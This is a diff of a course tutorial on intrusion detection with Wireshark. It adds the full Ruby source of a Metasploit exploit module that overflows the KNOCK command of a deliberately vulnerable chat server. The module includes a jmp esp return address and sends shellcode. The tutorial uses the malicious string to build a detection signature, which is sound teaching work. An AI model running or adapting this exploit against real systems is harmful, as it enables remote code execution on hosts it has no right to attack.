@@ -174,12 +174,88 @@ The binary content of the entire packet is shown in the bottom panel, including 
 
 ### Searching packet contents for intrusion detection
 
-The code below gives the Ruby code of the knock attack we wrote for Metasploit against our vulnerable chat server vchat. The statement in bold in Listing 7 1 defines the malicious string that is sent to vchat and is also listed as follows. 
+The code below gives the Ruby code of the knock attack we wrote for Metasploit against our vulnerable chat server vchat. The statement in bold defines the malicious string that is sent to vchat and is also listed as follows. 
 ```
     outbound = "KNOCK /.:/" + "A"*2002 + [target['jmpesp']].pack('V') + "C"*32 + shellcode 
 ```
 The variable outbound contains the malicious string. It can be observed that the malicious string contains the string "KNOCK /.:/" + "A"*2002, which is "KNOCK /.:/" followed by 2002 As. This string can be used as a signature to detect the knock attack.
+```
+##
+# The # symbol starts a comment
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+# File path: .msf4/modules/exploits/windows/vchat/knock.rb
+##
+# This module exploits the KNOCK command of vulnserver
+##
 
+class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
+  Rank = NormalRanking	# Potential impact to the target
+
+  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
+
+  def initialize(info = {})	# i.e. constructor, setting the initial values
+    super(update_info(info,
+      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command',	# Name of the target
+      'Description'    => %q{	# Explaining what the module does
+         vulnserver is intentially written vulnerable.
+      },
+      'Author'         => [ 'fxw' ],	## Hacker name
+      'License'        => MSF_LICENSE,
+      'References'     =>	# References for the vulnerability or exploit
+        [
+          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
+        ],
+      'Privileged'     => false,
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
+        },      
+      'Payload'        =>	# How to encode and generate the payload
+        {
+ #         'Space'    => 5000,	# Space that can hold shellcode? No need in this exploit
+          'BadChars' => "\x00\x0a"	# Bad characters to avoid in generated shellcode
+        },
+      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
+      'Targets'        =>	#  targets for many exploits
+        [
+          [ 'vulnserver-KNOCK',
+            {
+              'jmpesp' => 0x6250151C # This will be available in [target['jmpesp']]
+            }
+          ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
+
+
+    register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
+      [
+        Opt::RPORT(9999),
+	Opt::LPORT(11111)
+      ])
+  end
+
+  def exploit	# Actual exploit
+    print_status("Connecting to target...")
+    connect	# Connect to the target
+
+#    sock.get_once # poll the connection and see availability of any read data one time
+	  
+    shellcode = payload.encoded	# Generated and encoded shellcode
+    outbound = "KNOCK /.:/" + "A"*2002 + [target['jmpesp']].pack('V') + "C"*32 + shellcode # Create the malicious string that will be sent to the target
+
+    print_status("Trying target #{target.name}...")
+
+    sock.put(outbound)	# Send the attacking payload
+
+#    handler	# A handler is a process listening for and respondsing to connections from the target
+    disconnect	# disconnect the connection
+  end
+end
+```
 
 To find something such as a string within packets, click on *Edit* > *Find Packet*. 
 * Select *Packet list*, *Packet details* or *Packet bytes*, that is, where to search
